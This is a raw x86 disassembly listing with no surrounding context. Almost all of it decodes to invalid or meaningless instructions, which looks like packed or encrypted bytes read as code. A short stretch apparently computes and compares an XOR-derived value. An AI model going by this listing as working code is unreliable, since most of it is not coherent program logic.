  4055e8:	enter  0x4a5,0xa1
  4055ec:	mov    bl,BYTE PTR [edi]
  4055ee:	ins    DWORD PTR es:[edi],dx
  4055ef:	add    bl,dl
  4055f1:	ret    0xc7c6
  4055f4:	in     eax,dx
  4055f5:	inc    edx
  4055f6:	(bad)  
  4055f7:	cli    
  4055f8:	pop    edx
  4055f9:	repz add BYTE PTR [edi-0x5a81f46d],bl
  405600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405601:	jno    0x40565f
  405603:	pop    edi
  405604:	inc    edi
  405605:	icebp  
  405606:	pushf  
  405607:	cmc    
  405608:	inc    ebx
  405609:	pop    esp
  40560a:	push   ds
  40560b:	sub    eax,0xb8f512d1
  405610:	loop   0x405691
  405612:	adc    ebx,DWORD PTR [edi]
  405614:	push   es
  405615:	(bad)  
  405617:	xchg   edx,eax
  405618:	cli    
  405619:	xchg   edx,eax
  40561a:	imul   ebx,DWORD PTR [ebp-0x5f6c5a73],0x7ab39e16
  405624:	sub    DWORD PTR [ecx+0x37],0x5612a4a5
  40562b:	fdivr  QWORD PTR [edi]
  40562d:	pop    es
  40562e:	add    DWORD PTR [ecx],0xffffff8c
  405631:	daa    
  405632:	std    
  405633:	inc    esi
  405634:	enter  0x94d0,0xe1
  405638:	mov    cs,eax
  40563a:	rol    esp,1
  40563c:	dec    ebp
  40563d:	lock mov cs,esp
  405640:	or     cl,BYTE PTR [edi+0x13]
  405643:	push   edi
  405644:	xor    BYTE PTR [edi+edx*8],dh
  405647:	sub    eax,0x5beafcea
  40564c:	jne    0x90b70e8b
  405652:	or     eax,0x71e7a8a1
  405657:	adc    edi,edx
  405659:	sbb    cl,BYTE PTR ds:0x58aaaee4
  40565f:	mov    bh,0x1f
  405661:	adc    DWORD PTR [ecx],edi
  405663:	push   esi
  405664:	mov    BYTE PTR [edi-0x64cc785b],bh
  40566a:	xor    BYTE PTR [eax-0x2c],ch
  40566d:	mov    ds:0x9f6d647e,al
  405672:	cmp    esi,DWORD PTR [ebx+0x48]
  405675:	dec    esp
  405676:	loope  0x405623
  405678:	xor    edi,esp
  40567a:	test   DWORD PTR [esi-0x5453c841],esp
  405680:	cli    
  405681:	les    eax,FWORD PTR [ecx+0x7047ae72]
  405687:	cld    
  405688:	out    0x6,al
  40568a:	sti    
  40568b:	dec    ecx
  40568c:	adc    DWORD PTR [edi-0x28ce0532],ecx
  405692:	out    dx,al
  405693:	fadd   DWORD PTR [ecx+edi*2-0x7b86665]
  40569a:	mov    WORD PTR [edx],ss
  40569c:	push   ebx
  40569d:	jmp    0x961ce912
  4056a2:	sub    dl,dl
  4056a4:	adc    BYTE PTR [ecx],cl
  4056a6:	sbb    BYTE PTR [esi+0x3eefd3d9],dh
  4056ac:	push   es
  4056ad:	pop    es
  4056ae:	xchg   esp,eax
  4056af:	and    ebx,eax
  4056b1:	clc    
  4056b2:	into   
  4056b3:	and    DWORD PTR [edx+0x1f86a3b5],edx
  4056b9:	je     0x4056f2
  4056bb:	popf   
  4056bc:	mov    esi,0xda510765
  4056c1:	pop    ebp
  4056c2:	cmp    al,0xe0
  4056c4:	stc    
  4056c5:	dec    esi
  4056c6:	pop    esp
  4056c7:	sbb    al,0x33
  4056c9:	(bad)  
  4056ca:	or     eax,edx
  4056cc:	mov    edx,DWORD PTR [ebp-0x4]
  4056cf:	dec    eax
  4056d0:	not    eax
  4056d2:	jmp    0x405a73
  4056d7:	int    0x14
  4056d9:	mov    ds:0x7ab8a317,eax
  4056de:	sbb    al,0x97
  4056e0:	mov    ah,0x18
  4056e2:	shr    DWORD PTR [ebx-0x415b0941],1
  4056e8:	pop    ds
  4056e9:	mov    esi,0xbec4bdbe
  4056ee:	mov    esi,0x93a5f29f
  4056f3:	fwait
  4056f4:	xor    bh,BYTE PTR ds:0xdd126f35
  4056fa:	iret   
  4056fb:	mov    ch,0x7d
  4056fd:	push   0xad12b381
  405702:	rcr    DWORD PTR [ecx-0xf],0x45
  405706:	mov    ds,WORD PTR [esi]
  405708:	xchg   ebx,eax
  405709:	ds jle 0x40571d
  40570c:	jg     0x405737
  40570e:	ds inc ebp
  405711:	adc    al,0x80
  405713:	repz xchg edx,eax
  405715:	paddsb mm7,mm7
  405718:	call   0x1dac:0x312f653e
  40571f:	jnp    0x40572e
  405721:	adc    esp,esp
  405723:	jae    0x40570b
  405725:	xchg   ebp,eax
  405726:	rol    al,1
  405728:	inc    edi
  405729:	sbb    ebx,DWORD PTR [ebx+0x671cfd59]
  40572f:	pop    esp
  405730:	mov    ch,0x6
  405732:	sbb    esp,DWORD PTR [edi]
  405734:	loopne 0x405782
  405736:	mov    bh,0xbc
  405738:	dec    ebp
  405739:	not    BYTE PTR [ecx+0x4f904ed1]
  40573f:	add    eax,0x9957c9e1
  405744:	pop    ecx
  405745:	lock xchg ecx,eax
  405747:	loope  0x4056c9
  405749:	or     eax,DWORD PTR [edx]
  40574b:	sahf   
  40574c:	fstp   QWORD PTR [ecx-0x70]
  40574f:	gs jo  0x4057ba
  405752:	aam    0x66
  405754:	loop   0x40575a
  405756:	dec    edx
  405757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405758:	xor    esi,ecx
  40575a:	sub    al,0x7a
  40575c:	add    eax,0xc26cc0a9
  405761:	psrlq  mm5,QWORD PTR [ebx-0x31]
  405765:	dec    edx
  405766:	retf   0x13a2
  405769:	push   esi
  40576a:	test   DWORD PTR [ebx-0x2e],ecx
  40576d:	sbb    eax,0x96e32a1f
  405772:	xchg   BYTE PTR [esp+eax*1-0xe],bh
  405776:	xlat   BYTE PTR ds:[ebx]
  405777:	int    0x7e
  405779:	jmp    0x26a8:0x7138ad06
  405780:	or     BYTE PTR [ebx],dl
  405782:	and    eax,0xf810f12f
  405787:	inc    ebx
  405788:	xor    ebx,0x3fae64d8
  40578e:	sub    dh,BYTE PTR [ebx]
  405790:	ror    edi,1
  405792:	pop    ebp
  405793:	xchg   ebx,eax
  405794:	sub    dl,BYTE PTR [ecx]
  405796:	dec    esi
  405797:	test   BYTE PTR [ecx],bh
  405799:	add    al,0xd2
  40579b:	jbe    0x4057c3
  40579d:	ss loopne 0x405804
  4057a0:	outs   dx,BYTE PTR ds:[si]
  4057a2:	xor    cl,bl
  4057a4:	pushf  
  4057a5:	or     ch,BYTE PTR [edi+ebp*8]
  4057a8:	mov    esi,0xec5fba19
  4057ad:	sbb    ebp,edx
  4057af:	sub    BYTE PTR [eax-0x33],ch
  4057b2:	mov    dh,0xb3
  4057b4:	jb     0x405808
  4057b6:	stos   BYTE PTR es:[edi],al
  4057b7:	sbb    DWORD PTR fs:[edx],ecx
  4057ba:	cs std 
  4057bc:	inc    DWORD PTR [ebp+edi*8+0x1b]
  4057c0:	xor    DWORD PTR [edi+0x45],0xbd56725b
  4057c7:	inc    ebp
  4057c8:	cld    
  4057c9:	stc    
  4057ca:	pop    esi
  4057cb:	inc    eax
  4057cc:	ret    0x3893
  4057cf:	xchg   edx,eax
  4057d0:	pop    esp
  4057d1:	shl    DWORD PTR [ebx],0x8c
  4057d4:	jns    0x4057bf
  4057d6:	push   ebp
  4057d7:	gs in  al,dx
  4057d9:	pop    edx
  4057da:	mov    esi,?
  4057dc:	xlat   BYTE PTR ds:[ebx]
  4057dd:	aaa    
  4057de:	or     al,0x8b
  4057e0:	mov    es,esi
  4057e2:	pop    ebp
  4057e3:	mov    ds:0x278bc4ce,al
  4057e8:	mov    cl,0x33
  4057ea:	and    esi,DWORD PTR [ecx]
  4057ec:	or     al,0x6e
  4057ee:	mov    edi,0x439c2f7e
  4057f3:	inc    edi
  4057f4:	mov    eax,0xc24768fa
  4057f9:	and    DWORD PTR [ebx],esi
  4057fb:	fsubr  DWORD PTR [edi+0x193a61f]
  405801:	sbb    al,0x49
  405803:	mov    ss,WORD PTR [edx+eax*2-0x58ac8b2b]
  40580a:	add    edi,DWORD PTR [edx+edx*2]
  40580d:	sbb    DWORD PTR [ecx+edi*1],ebx
  405810:	push   eax
  405811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405812:	repz daa 
  405814:	aam    0x2d
  405816:	push   0xd4ee0765
  40581b:	rcl    BYTE PTR [edx],cl
  40581d:	jg     0x405865
  40581f:	xlat   BYTE PTR ds:[ebx]
  405820:	cdq    
  405821:	lods   eax,DWORD PTR ds:[esi]
  405822:	jge    0x405823
  405824:	xchg   ebp,eax
  405825:	jnp    0x40589b
  405827:	adc    edi,DWORD PTR [eax-0x3a]
  40582a:	dec    ecx
  40582b:	pushf  
  40582c:	mov    ebx,0xaa99c89
  405831:	lock jb 0x405843
  405834:	push   ebp
  405835:	mov    ?,WORD PTR [edi]
  405837:	fisubr WORD PTR [edi+0x4b9d9d2c]
  40583d:	push   eax
  40583e:	xchg   ebp,eax
  40583f:	outs   dx,DWORD PTR ds:[esi]
  405840:	pop    es
  405841:	xchg   ebp,eax
  405842:	jbe    0x405802
  405844:	inc    BYTE PTR [edi+0x2b]
  405847:	cmp    al,0xda
  405849:	ss mov ch,0x0
  40584c:	pushf  
  40584d:	pop    esi
  40584e:	mov    esi,0x2eeb3ba3
  405853:	fdiv   QWORD PTR [ecx]
  405855:	inc    edx
  405856:	leave  
  405857:	adc    dl,BYTE PTR [ebx-0x16d3e3a9]
  40585d:	fild   QWORD PTR [edi-0x3c0dd86a]
  405863:	push   ebx
  405864:	cdq    
  405865:	outs   dx,BYTE PTR ds:[esi]
  405866:	adc    BYTE PTR [edx],0xdc
  405869:	jo     0x405891
  40586b:	sbb    DWORD PTR [edx+0x680fba85],ebp
  405871:	xchg   BYTE PTR [esi+0x2cfea74e],dl
  405877:	mov    cl,0x25
  405879:	inc    ecx
  40587a:	sub    eax,0x4bfc1386
  40587f:	sub    BYTE PTR [ebx],0x96
  405882:	add    DWORD PTR ss:[ebx+0x5d],edx
  405886:	in     eax,dx
  405887:	jl     0x4058db
  405889:	std    
  40588a:	iret   
  40588b:	iret   
  40588c:	pop    ebp
  40588d:	sbb    al,0x6e
  40588f:	fs popf 
  405891:	pop    ebx
  405892:	xor    eax,0x992ef45b
  405897:	iret   
  405898:	jmp    0x6fb4f384
  40589d:	or     al,0xb3
  40589f:	pusha  
  4058a0:	mov    DWORD PTR [ecx-0x52],ebp
  4058a3:	xchg   edx,eax
  4058a4:	hlt    
  4058a5:	mov    eax,DWORD PTR [ebx-0x3b]
  4058a8:	mov    cl,0x59
  4058aa:	add    DWORD PTR [ebx],0x7589a147
  4058b0:	mov    al,ds:0x57060b2a
  4058b5:	mov    eax,0x85734c4f
  4058ba:	hlt    
  4058bb:	mov    ch,0xc3
  4058bd:	fcom   DWORD PTR [ecx-0x2a646e7]
  4058c3:	mov    edx,0x8de49771
  4058c8:	xchg   ebx,eax
  4058c9:	rcl    BYTE PTR [ebx],0x2
  4058cc:	fdivr  st,st(6)
  4058ce:	push   ds
  4058cf:	pop    ebx
  4058d0:	scas   eax,DWORD PTR es:[edi]
  4058d1:	adc    al,0x85
  4058d3:	sub    al,0x9e
  4058d5:	sahf   
  4058d6:	ret    
  4058d7:	rol    ah,0x4e
  4058da:	call   0x9b57:0x471b779f
  4058e1:	xchg   esp,eax
  4058e2:	dec    ebx
  4058e3:	aaa    
  4058e4:	das    
  4058e5:	xchg   esp,eax
  4058e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058e7:	jmp    0xb0a7:0x45c757f3
  4058ee:	push   es
  4058ef:	add    edi,DWORD PTR [ebx]
  4058f1:	ret    
  4058f2:	push   ds
  4058f3:	mov    cl,0x55
  4058f5:	ret    
  4058f6:	push   ds
  4058f7:	jecxz  0x4058dd
  4058f9:	add    ah,BYTE PTR [ecx+0x69c84500]
  4058ff:	mov    bl,0x5b
  405901:	mov    ds:0xf5a9da62,eax
  405906:	test   DWORD PTR [edi-0x3d0b5e3a],0xcce4beb3
  405910:	sar    DWORD PTR [edx-0x7cdad4b2],cl
  405916:	nop
  405917:	cmp    esi,DWORD PTR [edi-0x1a]
  40591a:	div    BYTE PTR [edx-0x78adfdc8]
  405920:	adc    al,BYTE PTR [esi]
  405922:	xchg   esp,eax
  405923:	adc    cl,bl
  405925:	jmp    0x405927
  405927:	add    al,0xc6
  405929:	les    ecx,FWORD PTR [edi+0x3ae9787f]
  40592f:	pop    esi
  405930:	daa    
  405931:	pop    ebp
  405932:	sar    DWORD PTR [ebx+0x746ce6b2],cl
  405938:	ins    DWORD PTR es:[edi],dx
  405939:	gs repz iret 
  40593c:	lahf   
  40593d:	mov    eax,ds:0x917d0429
  405942:	jae    0x405959
  405944:	leave  
  405945:	pop    eax
  405946:	in     al,dx
  405947:	inc    ebx
  405948:	in     eax,dx
  405949:	ins    DWORD PTR es:[edi],dx
  40594a:	pusha  
  40594b:	imul   esp,DWORD PTR [edx],0xffffffa9
  40594e:	mov    bh,0xae
  405950:	dec    edi
  405951:	mov    esp,?
  405953:	addr16 ret 
  405955:	jnp    0x405984
  405957:	(bad)  
  405958:	loopne 0x405913
  40595a:	or     eax,0xe381c307
  40595f:	out    dx,eax
  405960:	in     al,dx
  405961:	sbb    DWORD PTR [ebp+0x4a45149c],edi
  405967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405968:	rcr    DWORD PTR [edi],cl
  40596a:	xchg   esi,eax
  40596b:	mov    ds:0x982600ef,eax
  405970:	dec    ebx
  405971:	cmp    eax,0x27a092b3
  405976:	inc    ebp
  405977:	shr    BYTE PTR [edx+0x11],cl
  40597a:	mov    ?,WORD PTR ds:0xa5fa2b27
  405980:	lds    edx,FWORD PTR [esi+0x4c6194dd]
  405986:	arpl   WORD PTR [ebx+0x3f],bx
  405989:	fcomp  DWORD PTR [ecx+0x6316255]
  40598f:	push   ds
  405990:	fcom   st(2)
  405992:	fstp   DWORD PTR [esp+edx*1+0x1c]
  405996:	cmp    al,0xe2
  405998:	mov    ebx,0x452f6458
  40599d:	mov    gs,WORD PTR [edx]
  40599f:	cs xchg ebp,eax
  4059a1:	jge    0x4059f0
  4059a3:	jmp    0x98ed:0x2f820551
  4059aa:	and    eax,0x43f6bc90
  4059af:	mov    bl,0x13
  4059b1:	xor    ah,bh
  4059b3:	sub    al,0xba
  4059b5:	jns    0x4059b7
  4059b7:	xchg   DWORD PTR [ebx+0x74ee8820],edx
  4059bd:	mov    al,0x67
  4059bf:	sar    BYTE PTR [ebx-0x3e474270],1
  4059c5:	and    BYTE PTR [ecx+0x6e],dl
  4059c8:	iret   
  4059c9:	push   edi
  4059ca:	shl    DWORD PTR [edx+0x7f],0x21
  4059ce:	jnp    0x405993
  4059d0:	test   dl,cl
  4059d2:	retf   
  4059d3:	jmp    0x405a3f
  4059d5:	inc    edi
  4059d6:	fwait
  4059d7:	jle    0x4059a9
  4059d9:	cmc    
  4059da:	stc    
  4059db:	sbb    bl,bl
  4059dd:	sub    dl,BYTE PTR [ebx]
  4059df:	rcl    cl,1
  4059e1:	push   ds
  4059e2:	ss mov edi,0x5f9cb2be
  4059e8:	cli    
  4059e9:	mov    cl,ah
  4059eb:	out    0x92,al
  4059ed:	into   
  4059ee:	push   ecx
  4059ef:	inc    esp
  4059f0:	jle    0x4059a9
  4059f2:	sub    dh,dl
  4059f4:	fisub  WORD PTR [edx+0x29]
  4059f7:	mov    ecx,0xd7af8a24
  4059fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059fd:	sub    DWORD PTR [edi-0x60],ecx
  405a00:	push   ebx
  405a01:	lea    ecx,[ecx+0x7507bdb7]
  405a07:	into   
  405a08:	jg     0x405a07
  405a0a:	hlt    
  405a0b:	lods   eax,DWORD PTR ds:[esi]
  405a0c:	stos   BYTE PTR es:[edi],al
  405a0d:	enter  0xb027,0x20
  405a11:	push   cs
  405a12:	aas    
  405a13:	add    eax,0x579b7a09
  405a18:	aas    
  405a19:	jne    0x4059a8
  405a1b:	dec    esi
  405a1c:	daa    
  405a1d:	jg     0x405a9a
  405a1f:	sbb    al,0x9c
  405a21:	iret   
  405a22:	cmp    ch,BYTE PTR [edx+esi*4+0x2a6e56ea]
  405a29:	(bad)  
  405a2a:	mov    cl,0x19
  405a2c:	jp     0x405a52
  405a2e:	xchg   ebp,eax
  405a2f:	or     dh,dh
  405a31:	(bad)  
  405a32:	cmp    bh,BYTE PTR [edi]
  405a34:	shr    DWORD PTR [edi-0x3d],1
  405a37:	fistp  WORD PTR [edi+0x4b20404e]
  405a3d:	jmp    0x6f10f487
  405a42:	jle    0x405a54
  405a44:	je     0x405a04
  405a46:	nop
  405a47:	mov    ah,0x6f
  405a49:	mov    ah,0x54
  405a4b:	cs in  al,dx
  405a4d:	mov    ah,0xc1
  405a4f:	adc    BYTE PTR [edi],cl
  405a51:	dec    edi
  405a52:	dec    esp
  405a53:	iret   
  405a54:	or     BYTE PTR [edx],dl
  405a56:	and    BYTE PTR [eax],bh
  405a58:	mov    WORD PTR [esi+0x6f07577d],?
  405a5e:	aas    
  405a5f:	inc    eax
  405a60:	fsub   DWORD PTR [edx-0x2148512a]
  405a66:	and    DWORD PTR [esi+0x1391fb33],edi
  405a6c:	retf   0x4f03
  405a6f:	dec    edi
  405a70:	es push ss
  405a72:	cs and eax,edx
  405a75:	xor    ecx,edi
  405a77:	mov    DWORD PTR [ebp-0x4],eax
  405a7a:	mov    DWORD PTR [ebp+0x14],ecx
  405a7d:	xor    eax,eax
  405a7f:	or     DWORD PTR [ebp+0x14],eax
  405a82:	mov    eax,DWORD PTR [ebp-0x50]
  405a85:	mov    ecx,DWORD PTR [ebp-0x4c]
  405a88:	shrd   eax,ecx,0x2
  405a8c:	shr    ecx,0x2
  405a8f:	mov    cx,ax
  405a92:	mov    eax,DWORD PTR [ebp-0x50]
  405a95:	mov    edx,0x6d5d
  405a9a:	xor    cx,dx
  405a9d:	mov    edx,DWORD PTR [ebp-0x4c]
  405aa0:	xor    edx,edx
  405aa2:	shl    eax,0x1e
  405aa5:	mov    ax,dx
  405aa8:	or     ax,cx
  405aab:	mov    ecx,DWORD PTR [ebp-0x4]
  405aae:	cmp    WORD PTR [ecx],ax
  405ab1:	je     0x406288
  405ab7:	mov    eax,DWORD PTR [ebp+0x14]
  405aba:	sub    DWORD PTR [ebp-0x4],eax
  405abd:	mov    eax,DWORD PTR [esi]
  405abf:	jmp    0x405e60
  405ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ac5:	test   eax,0x3c522b52
  405aca:	mov    eax,0x46ddf0ac
  405acf:	xchg   edx,eax
  405ad0:	push   ebx
  405ad1:	or     DWORD PTR [esi-0x2f],edx
  405ad4:	mov    ebp,0xbdbebe25
  405ad9:	les    edi,FWORD PTR [esi+0x29cabdbe]
  405adf:	fnstcw WORD PTR [edx]
  405ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ae2:	cvtps2pd xmm7,QWORD PTR [ecx-0x7693bb54]
  405ae9:	sbb    esi,DWORD PTR es:[eax-0x2f]
  405aed:	dec    eax
  405aee:	in     eax,0xa6
  405af0:	xor    dh,0xc2
  405af3:	popf   
  405af4:	scas   eax,DWORD PTR es:[edi]
  405af5:	jg     0x405ab9
  405af7:	and    dh,cl
  405af9:	rcr    BYTE PTR [eax+eiz*4],1
  405afc:	mov    dh,0xc2
  405afe:	or     BYTE PTR [ebx],bh
  405b00:	bound  ebx,QWORD PTR [ecx]
  405b02:	jo     0x405ae0
  405b04:	cwde   
  405b05:	gs add bl,al
  405b08:	pop    esi
  405b09:	cli    
  405b0a:	pop    es
  405b0b:	mov    eax,0x7215089b
  405b10:	out    dx,al
  405b11:	and    eax,0xbe55e3db
  405b16:	push   ebx
  405b17:	scas   eax,DWORD PTR es:[edi]
  405b18:	xchg   edi,eax
  405b19:	mov    ah,0x9d
  405b1b:	loopne 0x405b76
  405b1d:	enter  0x7c70,0x0
  405b21:	mov    dl,0xf4
  405b23:	sub    eax,0xbb4cc337
  405b28:	jp     0x405b24
  405b2a:	or     dl,dl
  405b2c:	mov    al,ds:0xb7b35bc5
  405b31:	adc    cl,bh
  405b33:	jne    0x405aed
  405b35:	inc    ebx
  405b36:	js     0x405ac7
  405b38:	out    0x79,al
  405b3a:	clc    
  405b3b:	cmp    BYTE PTR [ecx+0x6ec06db5],0x96
  405b42:	pop    ss
  405b43:	dec    ebx
  405b44:	push   ebx
  405b45:	and    DWORD PTR [eax-0x3e],ebp
  405b48:	adc    BYTE PTR [eax+ecx*4],bh
  405b4b:	or     eax,0x31d8a1e4
  405b50:	push   cs
  405b51:	inc    esp
  405b52:	sbb    al,0xcd
  405b54:	retf   0x6000
  405b57:	mov    edi,0x13e7972a
  405b5c:	icebp  
  405b5d:	adc    ebx,0x8108ef6d
  405b63:	cmp    edi,DWORD PTR [ebx]
  405b65:	cmp    al,0x5f
  405b67:	sbb    ebp,DWORD PTR [esi]
  405b69:	mov    al,0xba
  405b6b:	xchg   esi,eax
  405b6c:	cmp    BYTE PTR [esi],0x99
  405b6f:	add    al,0x48
  405b71:	call   FWORD PTR [ecx+0x7ca99d02]
  405b77:	mov    ecx,0x4cde3268
  405b7c:	test   BYTE PTR [eax+0x19d93316],bl
  405b82:	shl    DWORD PTR [edi+eiz*8+0x66],0x8a
  405b87:	mov    WORD PTR [edx],cs
  405b89:	and    bl,al
  405b8b:	iret   
  405b8c:	pop    edi
  405b8d:	in     al,0x76
  405b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b90:	xor    eax,0xa6ae2ab
  405b95:	xchg   esi,eax
  405b96:	adc    BYTE PTR [ebp+ecx*1-0x5b65864a],ah
  405b9d:	add    eax,0x31ad67cc
  405ba2:	jmp    0x475d4ffc
  405ba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ba8:	add    al,0x96
  405baa:	jmp    0x508a185c
  405baf:	(bad)  
  405bb0:	shl    cl,cl
  405bb2:	js     0x405c16
  405bb4:	mov    ds:0xc077e57a,al
  405bb9:	out    0x77,eax
  405bbb:	mov    al,ds:0xb216a1e6
  405bc0:	imul   eax,ecx,0x6e
  405bc3:	and    BYTE PTR [ecx],0xf4
  405bc6:	xor    dh,0x3
  405bc9:	xchg   ebp,eax
  405bca:	rcl    BYTE PTR [edi-0x535fb659],1
  405bd0:	pop    ss
  405bd1:	daa    
  405bd2:	jg     0x405b71
  405bd4:	in     eax,0x5
  405bd6:	pop    es
  405bd7:	int    0xdf
  405bd9:	fnstsw WORD PTR [ecx]
  405bdb:	cmp    eax,0x297460be
  405be0:	push   edi
  405be1:	cmp    eax,0x17ea1339
  405be6:	push   eax
  405be7:	fs add eax,0x487050e3
  405bed:	xor    eax,0x9b34c5a7
  405bf2:	mov    ebx,0x4354339f
  405bf7:	inc    ebx
  405bf8:	sbb    DWORD PTR [esi-0x53],esp
  405bfb:	cmp    DWORD PTR [ebp+0x47d6d6a1],0xffffff9d
  405c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c03:	in     al,0x5a
  405c05:	fld    st(6)
  405c07:	push   ebx
  405c08:	xor    cl,ch
  405c0a:	mov    ecx,0x39354cd8
  405c0f:	and    ecx,DWORD PTR [edx-0x712aa882]
  405c15:	out    dx,eax
  405c16:	or     eax,0x2d80d708
  405c1b:	lahf   
  405c1c:	push   eax
  405c1d:	push   esi
  405c1e:	neg    DWORD PTR [esi+eax*8-0x2d]
  405c22:	sbb    DWORD PTR [esp+ecx*4+0x64],0xba038487
  405c2a:	adc    al,BYTE PTR [ecx]
  405c2c:	adc    dl,BYTE PTR [eax+0xfa9d643]
  405c32:	cld    
  405c33:	xor    BYTE PTR [ebp+0x6f],al
  405c36:	pop    es
  405c37:	dec    esi
  405c38:	psubsb mm6,QWORD PTR ds:0xcc3211c
  405c3f:	fcomip st,st(4)
  405c41:	pop    ss
  405c42:	inc    ecx
  405c43:	pop    edx
  405c44:	add    ah,BYTE PTR [ebp-0x32]
  405c47:	and    ch,bh
  405c49:	(bad)  
  405c4a:	mov    edi,edi
  405c4c:	add    ebp,DWORD PTR [eax+0x4d]
  405c4f:	jne    0x405be1
  405c51:	mov    esp,0xeda4a0d1
  405c56:	repz push edi
  405c58:	mov    al,0x2e
  405c5a:	xor    bh,ah
  405c5c:	cmp    BYTE PTR [edi],al
  405c5e:	dec    ebp
  405c5f:	out    0xed,al
  405c61:	add    al,0xa8
  405c63:	and    bh,BYTE PTR [ecx-0x51]
  405c66:	imul   DWORD PTR [edi-0x59]
  405c69:	fwait
  405c6a:	jne    0x405bf9
  405c6c:	ins    BYTE PTR es:[edi],dx
  405c6d:	jecxz  0x405c9c
  405c6f:	clc    
  405c70:	ficomp DWORD PTR [eax+0x16]
  405c73:	sub    DWORD PTR [ebx-0x4],ebp
  405c76:	imul   edx,DWORD PTR [ebx-0x7d],0xffffff81
  405c7a:	pop    edx
  405c7b:	mov    dh,0x8f
  405c7d:	fisubr WORD PTR [esp+ebp*8]
  405c80:	mov    ch,0x24
  405c82:	mov    esp,0xf67c1004
  405c87:	add    DWORD PTR [ecx+0x42],ebx
  405c8a:	das    
  405c8b:	or     BYTE PTR [ebp-0x76],0x43
  405c8f:	popa   
  405c90:	out    dx,al
  405c91:	sbb    al,0xd3
  405c93:	mov    dl,0x1
  405c95:	js     0x405ccb
  405c97:	mov    al,0x73
  405c99:	cld    
  405c9a:	inc    edx
  405c9b:	push   ds
  405c9c:	push   cs
  405c9d:	cmp    eax,0xbbc400c5
  405ca2:	add    al,0xe8
  405ca4:	(bad)  
  405ca5:	shl    BYTE PTR [edx],1
  405ca7:	ja     0x405d20
  405ca9:	repnz cdq 
  405cab:	ins    BYTE PTR es:[edi],dx
  405cac:	adc    eax,0x893f54f4
  405cb1:	dec    ebx
  405cb2:	sub    bh,BYTE PTR [ecx]
  405cb4:	mov    eax,eax
  405cb6:	push   eax
  405cb7:	enter  0x7216,0x45
  405cbb:	test   eax,0x4c8f7232
  405cc0:	pop    ebp
  405cc1:	push   ebp
  405cc2:	ds cwde 
  405cc4:	mov    ebp,0xc708d220
  405cc9:	(bad)  
  405cca:	stos   BYTE PTR es:[edi],al
  405ccb:	pop    esp
  405ccc:	dec    edi
  405ccd:	test   al,0x4a
  405ccf:	test   BYTE PTR [edx+0x37657a1c],ah
  405cd5:	nop
  405cd6:	pop    ecx
  405cd7:	les    ebp,FWORD PTR [edx+0x1fb429c0]
  405cdd:	retf   0x1f1f
  405ce0:	mov    al,0x96
  405ce2:	test   BYTE PTR [eax+0x289fd4f9],bh
  405ce8:	dec    eax
  405ce9:	ret    0xe46e
  405cec:	not    DWORD PTR [edi]
  405cee:	push   ebx
  405cef:	aas    
  405cf0:	sub    edx,DWORD PTR [eax-0x5a]
  405cf3:	loop   0x405d6e
  405cf5:	loop   0x405cfd
  405cf7:	dec    eax
  405cf8:	cmp    ebp,DWORD PTR [edi-0x894427a]
  405cfe:	sbb    DWORD PTR [ebp-0x4ef02ad3],0xffffff8e
  405d05:	or     eax,0xefcc2218
  405d0a:	jne    0x405d35
  405d0c:	in     eax,dx
  405d0d:	fld    QWORD PTR [edi-0x520f5fe7]
  405d13:	sbb    eax,0x29a17a40
  405d19:	jnp    0x405d0b
  405d1b:	jp     0x405d8b
  405d1d:	sar    esi,cl
  405d1f:	sar    DWORD PTR [esi],cl
  405d21:	jo     0x405d29
  405d23:	aaa    
  405d24:	sub    cl,ah
  405d26:	nop
  405d27:	cmp    al,0x8d
  405d29:	or     ecx,esp
  405d2b:	(bad)  
  405d2d:	ror    DWORD PTR [ecx-0x23],0x9a
  405d31:	ins    DWORD PTR es:[edi],dx
  405d32:	cwde   
  405d33:	bound  ecx,QWORD PTR [ebp+0x4976588c]
  405d39:	or     eax,0xd6ac7aab
  405d3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d3f:	xchg   esi,eax
  405d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d41:	dec    esp
  405d42:	iret   
  405d43:	mov    al,0xa4
  405d45:	std    
  405d46:	add    BYTE PTR cs:[eax-0x56a2aa17],ah
  405d4d:	(bad)  
  405d4e:	pop    ss
  405d4f:	push   es
  405d50:	sbb    ebp,edi
  405d52:	ror    BYTE PTR [esi-0x3f],0xfe
  405d56:	or     bh,ch
  405d58:	mov    eax,0xf6b626cb
  405d5d:	gs pop ebx
  405d5f:	mov    ah,0x65
  405d61:	mov    ecx,0xdf834c9e
  405d66:	adc    esi,ebp
  405d68:	outs   dx,BYTE PTR ds:[esi]
  405d69:	xchg   ebx,eax
  405d6a:	addr16 pop es
  405d6c:	sbb    esp,eax
  405d6e:	push   edi
  405d6f:	mov    bh,0x5f
  405d71:	fild   DWORD PTR [edx+0x48]
  405d74:	mov    ah,0x16
  405d76:	or     eax,0x23d1b329
  405d7b:	(bad)  [ebx+0x6f]
  405d7e:	clc    
  405d7f:	mov    bl,dh
  405d81:	fidiv  DWORD PTR [eax]
  405d83:	test   DWORD PTR [edx+0x7bdb7630],esp
  405d89:	add    ebp,DWORD PTR [ebp+0x77]
  405d8c:	mov    dl,0xee
  405d8e:	sub    ebp,DWORD PTR [eax]
  405d90:	adc    DWORD PTR [eax+0x65c1f19e],0x44
  405d97:	and    BYTE PTR [ecx-0x18],cl
  405d9a:	loope  0x405ddc
  405d9c:	or     DWORD PTR [edi],esi
  405d9e:	sub    ecx,ecx
  405da0:	xchg   cl,al
  405da2:	push   ebp
  405da3:	inc    eax
  405da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405da5:	cwde   
  405da6:	push   0x40
  405da8:	pop    eax
  405da9:	jp     0x405dc1
  405dab:	cs inc esi
  405dad:	jbe    0x405d74
  405daf:	adc    DWORD PTR [esi+0x6e],edx
  405db2:	mul    BYTE PTR [eax]
